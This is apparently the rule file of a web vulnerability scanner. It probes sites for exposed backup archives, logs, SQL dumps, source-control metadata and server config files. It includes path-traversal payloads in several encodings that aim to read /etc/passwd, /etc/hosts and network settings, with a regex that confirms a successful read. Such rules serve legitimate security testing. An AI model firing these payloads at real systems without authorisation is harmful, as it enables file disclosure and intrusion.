# -*-conding=utf-8-*-

FileRule = {
    # 黑名单
    "balcklist":{
        "html":[
            #"initBehaviors"
        ],
        "header":[""]
    },
    # 扫描规则
    "whitelist":{
        # http://www.0aa.me/1.rar
        "url_backup": {
            # 是否每个目录都扫描
            "dir": True,
            # 是否需要拼接后缀
            "suffix": True,
            # 规则
            "name":[{
                "rule_true":[
                    # zip rar
                    "web", "webroot", "WebRoot", "website", "bin", "bbs", "shop", "www", "wwww",
                    1, 2, 3, 4, 5, 6, 7, 8, 9,
                    "www1", "www2", "www3", "www4", "default", "log", "logo", "kibana", "elk", "weblog",
                    "mysql", "ftp", "FTP", "MySQL", "redis", "Redis",
                    "cgi", "php", "jsp",
                    "access", "error", "logs", "other_vhosts_access",
                    "database", "sql","old","temp","package","tmp","test","backup","db","data","output","admin","upload","website","index","tools"
                ],
                "rule_false": "fuckcar10240x4d53"
            }],
            # 后缀
            "filename": [
                "rar", "zip", "tar.gz", "tar.gtar", "tar", "tgz", "tar.bz", "tar.bz2", "bz", "bz2", "boz", "3gp", "gz2","old","backup","bak"
            ],
            # 判断是否存在
            "result": {
                "length": 50,
                "status_code": [200],
                "header":{
                    "Content-Type":[
                        "application\/x-gzip", "text\/plain", "application\/x-bzip", "application\/bacnet-xdd+zip", "application\/x-gtar","application\/x-compressed", "application\/x-rar-compressed", "application\/x-tar", "application\/zip", "application\/force-download","application\/.*file", "application\/.*zip", "application\/.*rar", "application\/.*tar", "application\/.*down"
                    ]
                }
            }
        },
        "url_log": {
            # 是否每个目录都扫描
            "dir": True,
            # 是否需要拼接后缀
            "suffix": True,
            # 规则
            "name": [{
                "rule_true": [
                    "web", "webroot", "WebRoot", "website", "bin", "bbs", "shop", "www", "wwww",
                    1, 2, 3, 4, 5, 6, 7, 8, 9,
                    "www1", "www2", "www3", "www4", "default", "log", "logo", "kibana", "elk", "weblog",
                    "mysql", "ftp", "FTP", "MySQL", "redis", "Redis",
                    "cgi", "php", "jsp",
                    "access", "error", "logs", "other_vhosts_access",
                    "database", "sql", "create", "select", "insert", "update","old","temp","package","tmp","test","backup","db","data","output","admin","upload","website","index","tools"
                ],
                "rule_false": "fuckcar10240x4d53"
            }],
            # 后缀
            "filename": [
                "sql", "log", "log.1"
            ],
            # 判断是否存在
            "result": {
                "length": 20,
                "status_code": [200],
                "header": {
                    "Content-Type": [
                        "text\/html", "text\/plain",
                    ]
                },
                "reg":[
                    "\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}.*\d{2,4}:\d{2,4}:\d{2,4}:\d{2,4}.*",
                    "\d{2,4}:\d{2,4}:\d{2,4}:\d{2,4}.*\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}",
                    "select.*from",
                    "create.*table",
                ]
            }
        },
        "url_dir":{
            "dir": True,
            "suffix": False,
            # 规则
            "name": [
                {"rule_true": ["../../../../../../../../../../../etc/passwd",
                "../../../../../../../../../../../../../etc/hosts",
                "../../../../../../../../../../../../../etc/sysconfig/network-scripts/ifcfg-eth1",
                "%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/%c0%ae%c0%ae/etc/hosts",
                "..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fpasswd",
                "..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "/././././././././././././././././././././././././../../../../../../../../etc/passwd",
                "/aa/../../cc/../../bb/../../dd/../../aa/../../cc/../../bb/../../dd/../../bb/../../dd/../../bb/../../dd/../../bb/../../dd/../../ee/../../etc/hosts",
                "resource/tutorial/jndi-appconfig/test?inputFile=/etc/passwd"
                ],
                "rule_false":"../../../../../../../../../../../etc/passww"},
            ],
            # 判断是否存在
            "result": {
                "length": 30,
                "status_code": [200],
                "reg": [
                    "root:[a-z]{1}:\d+:\d:"
                ]
            }
        },
        "url_git":{
            "dir": True,
            "suffix": False,
            # 规则
            "name": [
                {"rule_true": ".git/config", "rule_false":".git/configs"}
            ],
            # 判断是否存在
            "result": {
                "length": 20,
                "status_code": [200],
                "reg":[
                    "repositoryformatversion"
                ]

            }
        },
        "url_svn":{
            "dir": True,
            "suffix": False,
            # 规则
            "name": [
                {"rule_true": ".svn/all-wcprops", "rule_false":".svn/all-wcpropss"}
            ],
            # 判断是否存在
            "result": {
                "length": 20,
                "status_code": [200],
                "reg":[
                    "svn:wc:ra_dav:version-url"
                ]
            }
        },
        "url_webxml":{
            "dir": True,
            "suffix": False,
            # 规则
            "name": [
                {"rule_true": "WEB-INF/web.xml", "rule_false":"WEB-INF/web.xmls"}
            ],
            # 判断是否存在
            "result": {
                "length": 20,
                "status_code": [200],
                "reg":[
                    "<\\?xml version=\""
                ]
            }
        },
        "url_webconfig":{
            "dir": True,
            "suffix": False,
            # 规则
            "name": [
                {"rule_true": "web.config", "rule_false":"web.configs"}
            ],
            # 判断是否存在
            "result": {
                "length": 20,
                "status_code": [200],
                "reg":[
                    "<\\?xml version=\"",
                    "<configuration>(.*?)</configuration>"
                ]
            }
        },

    },
}
